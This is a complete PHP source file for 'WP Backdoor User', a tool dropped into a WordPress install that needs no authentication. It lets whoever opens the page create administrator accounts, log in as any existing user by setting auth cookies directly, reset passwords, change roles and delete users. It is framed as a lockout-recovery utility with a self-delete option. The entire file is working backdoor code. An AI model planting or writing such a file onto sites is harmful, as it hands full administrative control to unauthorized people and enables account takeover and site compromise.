<?php
/*********************************************
=== WP Backdoor User ===

Script Name: WP Backdoor User
Script URI: http://www.boiteaweb.fr/WPBU
Author URI: http://www.boiteaweb.fr
Author: Julio Potier
Version: 2.1
Tags: wordpress, security, admin, user, wp
License: GPL
**********************************************/
// Force the file to be renamed for security reasons
if( strtolower( basename( __FILE__ ) ) == 'wp_backdoor_user.php' )
	die( 'EN: Please rename the file before use! FR : Merci de renommer le fichier avant utilisation !' );

// Load WordPress
while( !is_file( 'wp-load.php' ) ) {
	if( is_dir( '..' ) ) 
		chdir( '..' );
	else
		die( 'EN: Could not find WordPress! FR : Impossible de trouver WordPress !' );
}
require_once( 'wp-load.php' );

// Get all roles
$roles = new WP_Roles();
$roles = $roles->get_names();
$roles = array_map( 'translate_user_role', $roles );
// if an action is triggered
if( isset( $_REQUEST['action'] ) ):

switch( $_REQUEST['action'] ):

	// User Creation
	case 'create_user':
	
		// Default new user informations
		$new_user_email = str_replace( ' ', '+', $_REQUEST['user_email'] != '' ? $_REQUEST['user_email'] : time() . '@fake' . time() . '.com' );
		$new_user_pass = $_REQUEST['user_pass'] != '' ? $_REQUEST['user_pass'] : time();
		$new_user_role = array_key_exists( $_REQUEST['user_role'], $roles ) ? $_REQUEST['user_role'] : 'administrator';
		$new_user_login = $_REQUEST['user_login'] != '' ? $_REQUEST['user_login'] : $new_user_role . '_' . substr( md5( uniqid() . time() ), 0, 7 );

		// Is this user_exists, stop script
		if( username_exists( $new_user_login ) )
			wp_die( new WP_Error('existing_user_login', __('This username is already registered.') ) );

		// Create this user
		$my_user_id = wp_create_user( $new_user_login, $new_user_pass, $new_user_email );
		  
		// Problem on creation ? Stop script
		if( is_wp_error( $my_user_id ) )
			wp_die( new WP_Error( 'registerfail', sprintf( __( '<strong>ERROR</strong>: Couldn&#8217;t register you... please contact the <a href="mailto:%s">webmaster</a> !' ), esc_attr( get_option( 'admin_email' ) ) ) ) );
		 
		// Set admin role to this user
		$user = new WP_User( $my_user_id );
		$user->set_role( $new_user_role ); 
		
		// is we want to log in
		if( isset( $_REQUEST['log_in'] ) ):
			// Sign on this user
			wp_signon( array( 'user_login' => $new_user_login, 'user_password' => $new_user_pass ) );
			// Redirects you on your profile, change your password ;)
			unlink( __FILE__ );
			wp_redirect( admin_url( 'profile.php' )  );
			exit();
		endif;
		// Little message
		$msg='User created!';
	break;
	
	// login user action
	case 'login_user' :
		// get current user's data
		$user_data = get_userdata( $_REQUEST['user_ID'] );
		// Set current user to this user's id
		wp_set_current_user( $user_data->ID, $user_data->user_login );
		// Same with cookie
		wp_set_auth_cookie( $user_data->ID );
		// The hook "wp_login"
		do_action( 'wp_login', $user_data->user_login );
		// Delete this file for security reasons
		unlink( __FILE__ );
		// Redirect on dashboard
		wp_redirect( admin_url( 'index.php' ) );
		// Always die after direct
		die();
	break;
	case 'delete_user':
		// Delete this user and re-attribute is needed
		wp_delete_user( $_REQUEST['user_ID'], $_REQUEST['new_user_ID'] );
		$msg = 'User deleted!';
	break;
	case 'edit_user':
		// If a role change is needed
		if( $_REQUEST['user_role'] != '-1' ):
			// Get the user
			$user = new WP_User( $_REQUEST['user_ID'] );
			// Set his role
			$user->set_role( $_REQUEST['user_role'] ); 
			$msg = 'User updated!';
		endif;
		// If a pass chage is needed
		if( $_REQUEST['user_pass'] != '' ):
			// update the member's pass
			wp_update_user( array( 'ID'=>$_REQUEST['user_ID'], 'user_pass' => $_REQUEST['user_pass'] ) );
			$msg = 'User updated!';
		endif;
	break;
	case 'delete_file':
		// just unlink the file
		unlink( __FILE__ );
		$msg = 'File deleted!';
	break;
endswitch;

endif;

// Create selectbox for roles
$select_roles = '';
foreach( $roles as $krole=>$i18nrole )
	$select_roles .= '<option value="'.$krole.'">'.$i18nrole.'</option>'."\n";

// Get all users
if( function_exists( 'get_users' ) )
	$all_users = get_users();
else {
	$usersID = $wpdb->get_col( 'SELECT ID FROM ' . $wpdb->users . ' ORDER BY ID ASC' );
	foreach ( $usersID as $uid ) 
		$all_users[] = get_userdata( $uid );
}

// Create selectbox for users
$select_users = '';	
foreach( $all_users as $user ):
	$the_user = new WP_User( $user->ID );
	if( isset( $the_user->roles[0] ) )
		$select_users .= '<option value="'.$user->ID.'">' . $user->user_login . ' (' . $the_user->roles[0] . ')</option>'."\n";
endforeach;

// HTML CODE
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//FR" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<title>WP Backdoor User v2.0</title>
		<style>
			* { font-family: verdana, tahoma, arial; }
			h1 { color: #000000; text-shadow: 0 0 4px white, 0 -5px 4px #FFFF33, 2px -10px 6px #FFDD33, -2px -15px 11px #FF8800, 2px -25px 18px #FF2200; }
			h1 a { text-shadow: none; }
			div { box-shadow: 2px 2px 1px #000000; float: left; height: 290px; width: 270px; padding: 10px; margin: 10px; border-radius: 5px; border: 2px dotted #cccccc; background-color: #eeeeee; }
			h2 { text-shadow: -1px -1px 1px #ffffff; padding: 0px; margin: 0px;border-bottom: 2px dotted #ffffff; }
			em {font-size: x-small; }
			.footer { clear: both; font-style: italic; font-size: small; padding-top: 15px; border-top: 1px dotted #000000; }
			.warning{ max-width: 1215px; background-color: #F54747; border: 1px dashed #6F0202; border-radius: 5px 5px 5px 5px; clear: both; font-weight: bold; margin: 10px; padding: 10px; }
			h1 > span { font-size:x-small; }
			p { line-height: 1em;}
			label.small{ font-size: small; }
			.slogan{ margin-top: -20px; font-style: italic; font-size: small; color: #cccccc;}
		</style>
	</head>
	<body>
	<h1><nobr>WP Backdoor User</nobr> <span><nobr><a href="<?php echo admin_url(); ?>">Go to admin dashboard</a> - <a href="<?php echo $_SERVER['PHP_SELF']; ?>">Refresh page</a></span></nobr></h1>
	<p class="slogan">"Don't have an access? Just create yours!"</p>
	<?php if( isset( $_REQUEST['action'] ) ): ?>
		<p class="warning"><?php echo $msg; ?></p>
	<?php endif; ?>
		<div>
			<h2>Create WP User</h2>
			<form method="post">
				<p><label>User Login: <input type="text" name="user_login" placeholder="Leave blank to random" /></label></p>
				<p><label>User Pass: <input type="text" name="user_pass" placeholder="Leave blank to random" /></label></p>
				<p><label>User Email: <input type="email" name="user_email" placeholder="Leave blank to random" /></label></p>
				<p><label>User Role: <select name="user_role"><?php echo $select_roles; ?></select></label></p>
				<p><label class="small"><input type="checkbox" name="log_in" checked="checked" /> Log in with this user after creation</label></p>
				<p><input type="submit" value="Create this user"/></p>
				<input type="hidden" name="action" value="create_user" />
				<p><em>This file will be automatically deleted then.</em></p>
			</form>
		</div>		
		<div>
			<h2>Log in w. WP User</h2>
			<form method="post">
				<p><label>User: <select name="user_ID"><?php echo $select_users; ?></select></label></p>
				<p><input type="submit" value="Log in with this user"/></p>
				<input type="hidden" name="action" value="login_user" />
				<p><em>This file will be automatically deleted then.</em></p>
			</form>
		</div>
		<div>
			<h2>Delete WP User</h2>
			<form method="post">
				<p><label>User: <select name="user_ID"><?php echo $select_users; ?></select></label></p>
				<p><label>Attribute all posts and links to:<br /><select name="new_user_ID"><option value="novalue" selected="selected">Do not re-attribute</option><?php echo $select_users; ?></select></label></p>
				<p><input type="submit" value="Delete this user"/></p>
				<input type="hidden" name="action" value="delete_user" />
				<p><em>Take care, do not delete all users! You're warned.</em></p>
				<p><em>Do not forget to delete this file after use!<br /><a href="?action=delete_file">Click here to delete it now!</a></em></p>
			</form>
		</div>		
		<div>
			<h2>Edit WP User</h2>
			<form method="post">
				<p><label>User: <select name="user_ID"><?php echo $select_users; ?></select></label></p>
				<p><label>New Role: <select name="user_role"><option selected="selected" value="-1">Do not change</option><?php echo $select_roles; ?></select></label></p>
				<p><label>New Pass: <input type="text" name="user_pass" placeholder="Do not change"/></label></p>
				<p><input type="submit" value="Edit this user"/></p>
				<input type="hidden" name="action" value="edit_user" />
				<p><em>Do not forget to delete this file after use!<br /><a href="?action=delete_file">Click here to delete it now!</a></em></p>
			</form>
		</div>
		<p class="warning">Do not forget to delete this file after use! <a href="?action=delete_file">Click here to delete it now!</a></p>
		<p class="footer"> ~ <a href="https://github.com/BoiteAWeb/WP-Backdoor-User/" target="_blank">WP Backdoor User v2.0</a> ~ <a href="mailto:julio@boiteaweb.fr" target="_blank">julio@boiteaweb.fr</a> ~ <a href="http://www.boiteaweb.fr" target="_blank">http://www.boiteaweb.fr</a> ~ <a href="http://twitter.com/boiteaweb" target="_blank">@boiteaweb</a> ~</p>
	</body>
</html>